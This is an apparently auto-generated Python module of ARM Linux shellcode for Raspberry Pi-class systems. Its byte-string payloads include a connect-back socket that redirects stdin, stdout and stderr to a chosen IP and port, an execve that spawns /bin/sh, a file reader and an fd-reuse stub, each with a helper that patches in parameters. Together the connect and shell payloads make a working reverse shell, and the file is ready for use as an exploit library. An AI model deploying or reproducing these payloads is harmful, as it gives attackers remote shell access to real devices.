#!/usr/bin/python

# THIS FILE WAS GENERATED BY RUNNING MAKE
# IF YOU WANT TO MODIFY THIS FILE, YOU SHOULD MODIFY THE SOURCE IN src/ THEN RUN make

# Date Created:
# Tue Oct 22 04:44:16 UTC 2013

# uname -a:
# Linux raspberrypi 3.6.11+ #371 PREEMPT Thu Feb 7 16:31:35 GMT 2013 armv6l GNU/Linux

# assembler:
# GNU assembler (GNU Binutils for Debian) 2.22
# Copyright 2011 Free Software Foundation, Inc.
# This program is free software; you may redistribute it under the terms of
# the GNU General Public License version 3 or later.
# This program has absolutely no warranty.
# This assembler was configured for a target of `arm-linux-gnueabihf'.

connect_shellcode = ""
connect_shellcode += "\x02\x00\xa0\xe3\x01\x10\xa0\xe3\x00\x20\xa0\xe3\xff\x70\xa0\xe3"
connect_shellcode += "\x1a\x70\x87\xe2\x00\x00\x00\xef\x00\x00\x50\xe3\x15\x00\x00\xba"
connect_shellcode += "\x00\x40\xa0\xe1\x04\x00\xa0\xe1\x54\x10\x8f\xe2\x10\x20\xa0\xe3"
connect_shellcode += "\xff\x70\xa0\xe3\x1c\x70\x87\xe2\x00\x00\x00\xef\x00\x00\x50\xe3"
connect_shellcode += "\x0c\x00\x00\x1a\x04\x00\xa0\xe1\x00\x10\xa0\xe3\x3f\x70\xa0\xe3"
connect_shellcode += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3\x3f\x70\xa0\xe3"
connect_shellcode += "\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3\x3f\x70\xa0\xe3"
connect_shellcode += "\x00\x00\x00\xef\x04\x00\x00\xea\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
connect_shellcode += "\x00\x00\x00\xef\x02\x00\x04\xd2\x7f\x00\x00\x01"

execve_shellcode = ""
execve_shellcode += "\x00\x00\xa0\xe3\x01\x00\x2d\xe9\x44\x00\x8f\xe2\x00\x10\xd0\xe5"
execve_shellcode += "\x00\x00\x51\xe3\x04\x00\x00\x0a\x01\x00\x2d\xe9\x01\x10\xd0\xe4"
execve_shellcode += "\x00\x00\x51\xe3\xfc\xff\xff\x1a\xf7\xff\xff\xea\x00\x00\x9d\xe5"
execve_shellcode += "\x0d\x10\xa0\xe1\x00\x20\xa0\xe3\x04\x00\x2d\xe9\x0d\x20\xa0\xe1"
execve_shellcode += "\x0b\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
execve_shellcode += "\x00\x00\x00\xef\x2d\x61\x00\x2f\x62\x69\x6e\x2f\x75\x6e\x61\x6d"
execve_shellcode += "\x65\x00\x00\x00"

execve_sh_shellcode = ""
execve_sh_shellcode += "\x18\x00\x8f\xe2\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x0b\x70\xa0\xe3"
execve_sh_shellcode += "\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"
execve_sh_shellcode += "\x2f\x62\x69\x6e\x2f\x73\x68\x00"

exit_shellcode = ""
exit_shellcode += "\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"

helloworld_shellcode = ""
helloworld_shellcode += "\x01\x00\xa0\xe3\x14\x10\x8f\xe2\x0d\x20\xa0\xe3\x04\x70\xa0\xe3"
helloworld_shellcode += "\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3\x00\x00\x00\xef"
helloworld_shellcode += "\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x72\x6c\x64\x21\x0a\x00\x00\x00"

readfile_shellcode = ""
readfile_shellcode += "\x6c\x00\x8f\xe2\x00\x10\xa0\xe3\x00\x20\xa0\xe3\x05\x70\xa0\xe3"
readfile_shellcode += "\x00\x00\x00\xef\x00\x00\x50\xe3\x12\x00\x00\xba\x00\x60\xa0\xe1"
readfile_shellcode += "\x00\x00\xa0\xe3\x01\x00\x2d\xe9\x06\x00\xa0\xe1\x0d\x10\xa0\xe1"
readfile_shellcode += "\x01\x20\xa0\xe3\x03\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\x50\xe3"
readfile_shellcode += "\x05\x00\x00\xda\x01\x00\xa0\xe3\x0d\x10\xa0\xe1\x01\x20\xa0\xe3"
readfile_shellcode += "\x04\x70\xa0\xe3\x00\x00\x00\xef\xf2\xff\xff\xea\x06\x00\xa0\xe1"
readfile_shellcode += "\x06\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\xa0\xe3\x01\x70\xa0\xe3"
readfile_shellcode += "\x00\x00\x00\xef\x72\x65\x61\x64\x66\x69\x6c\x65\x2e\x73\x00\x00"

reusefd_shellcode = ""
reusefd_shellcode += "\x34\x40\x8f\xe2\x00\x40\x94\xe5\x04\x00\xa0\xe1\x00\x10\xa0\xe3"
reusefd_shellcode += "\x3f\x70\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x01\x10\xa0\xe3"
reusefd_shellcode += "\x3f\x70\xa0\xe3\x00\x00\x00\xef\x04\x00\xa0\xe1\x02\x10\xa0\xe3"
reusefd_shellcode += "\x3f\x70\xa0\xe3\x00\x00\x00\xef\x00\x00\x00\xea\x05\x00\x00\x00"


def connect(ip, port):
	import struct
	import socket
	params = struct.pack("!H", port) + socket.inet_aton(ip)
	return connect_shellcode[:-6] + params


def execve(parameter_list):
	params = ""
	for x in reversed(parameter_list):
		params += x + "\x00"
	params += "\x00"
	return execve_shellcode[:-(len("-a\x00/bin/uname\x00\x00")+1)] + params

def execve_sh():
	return execve_sh_shellcode


def exit():
	return exit_shellcode


def helloworld():
	return helloworld_shellcode


def readfile(filename):
	params = filename + "\x00"
	return readfile_shellcode[:-(len("readfile.s\x00")+1)] + params


def reusefd(fd):
	import struct
	params = struct.pack("<I", int(fd))
	return reusefd_shellcode[:-4] + params

